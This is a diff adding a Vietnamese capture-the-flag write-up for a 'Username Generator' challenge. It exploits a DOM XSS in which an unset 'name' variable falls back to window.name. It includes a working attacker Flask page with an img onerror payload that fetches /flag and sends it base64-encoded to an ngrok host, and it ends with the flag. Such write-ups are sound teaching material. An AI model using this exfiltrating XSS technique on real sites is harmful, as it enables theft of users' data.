@@ -329,7 +329,128 @@ pass
 
 ## Username Generator
 
-if(usernameLength > 0): Thì khi usernameLength = 0 biến `{name}` sẽ không được khai báo, từ nó đó sẽ nhận biến toàn cục là `window.name`. `window.name` là biến toàn cục trong javascript chỉ đến tên của tab(window) hiện tại vì thế với payload kiểu: `window.open('/', 'fetch('url').then(response => response.text()).then(fetch("ngrok"+response))')`
+Description hint `XSS` và `js_scope` đồng thời cho luôn source code:
+
+`docker-compose.yml`:
+```
+version: "3"
+services:
+  app:
+    build: ./app
+    ports:
+      - 80:80
+    environment:
+      - FLAG=SEE{REDACTED}
+
+  admin:
+    build: ./admin
+    privileged: true
+    ports:
+      - 8000:8000
+```
+
+`app.py`: chạy ở port 80
+```python
+from flask import Flask, render_template, request
+import socket
+import os
+
+app = Flask(__name__)
+admin_ip = socket.gethostbyname("admin")
+
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/flag')
+def flag():
+    if request.remote_addr == admin_ip:
+        return os.environ["FLAG"]
+
+    else:
+        return "You're not admin!"
+
+
+if __name__ == '__main__':
+    app.run()
+```
+Điều đáng chú ý ở đây là `remote_addr` phải bằng `admin_ip`, mà `admin_ip = socket.gethostbyname("admin")` tức hostname là/phải là `app`.
+
+`main.js`: ở port 8000 là 1 con bot lấy url và đến xem
+
+`index.js`:
+
+```js
+const generate = (length) => {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+ 
+const queryString = window.location.search;
+const parameters = new URLSearchParams(queryString);
+const usernameLength = parameters.get('length');
+
+// Generate a random username and display it
+if (usernameLength === null) {
+    var name = "loading...";
+    window.location.href = "/?length=10";
+}
+else if (usernameLength.length > 0) {
+    var name = generate(+usernameLength);
+}
+document.getElementById('generatedUsername').innerHTML = `Your generated username is: ${name}`;
+```
+
+Ở đây ta chỉ có thể kiểm soát tham số `length`, cái mà không thể chèn payload XSS được.
+
+Phân tích sâu hơn, ở đây nếu `usernameLength` khác `null` tức là được set và `usernameLength.length` mà bằng 0 tức `?length=`(1 string rỗng) thì biến `name` sẽ không được set.
+
+Đáng chú ý hơn, `name` hay `window.name` là biến toàn cục trong javascript, nó chỉ đến tên gọi của window/tab hiện tại.
+
+![Screenshot (907)](https://user-images.githubusercontent.com/71699412/172574375-f5eb67cf-0612-404d-bd8e-289fc4922501.png)
+
+Vậy nếu ta mở được 1 tab mới bằng `window.open()` với tên ta tab ta có thể kiểm soát, đây chính là xss inject point.
+
+**Syntax**: `window.open(URL, name, specs, replace)`
+
+Ta tạo 1 flask server và public bằng ngrok:
+`app.py`:
+
+```python
+from flask import Flask, render_template
+
+app = Flask(__name__)
+
+@app.route("/", methods=['GET', 'POST'])
+def index():
+	return """
+		<script>
+			window.open('http://app:80/?length=', `<img src='x' onerror='fetch("/flag").then(response => response.text()).then(flag => {fetch("https://0487-222-252-33-98.ap.ngrok.io/done?c="+btoa(flag))})'>`);
+		</script>
+	"""
+
+if __name__ == '__main__':
+	app.run(host="0.0.0.0", port=8989, debug=True)
+```**Lưu ý thêm**: 
+
+1. Dùng tag `</script>` bị dính lỗi end of string nên dùng `<img>` là đủ.
+2. Tên hostname phải là `app`
+3. Payload đơn giản là mở 1 tab `app:80` mới với tên chứa xss payload. Inject vào username page tag `<img>` onerror thì fetch đến `/flag` sau đó gửi lại cho server của ta.
+
+Ta nộp url là link ngrok vào page admin, sau 1 hồi nhận được:
+
+![Screenshot (906)](https://user-images.githubusercontent.com/71699412/172575576-32f39c59-b934-42f6-93e7-793524e99891.png)
+
+Base64 decode là được flag thôi.
+
+**flag**: `# SEE{x55_15_my_m1ddl3_n4m3_00d21e74f830352781874d57dff7e384}`
 
 ## The Pigeon Files
 
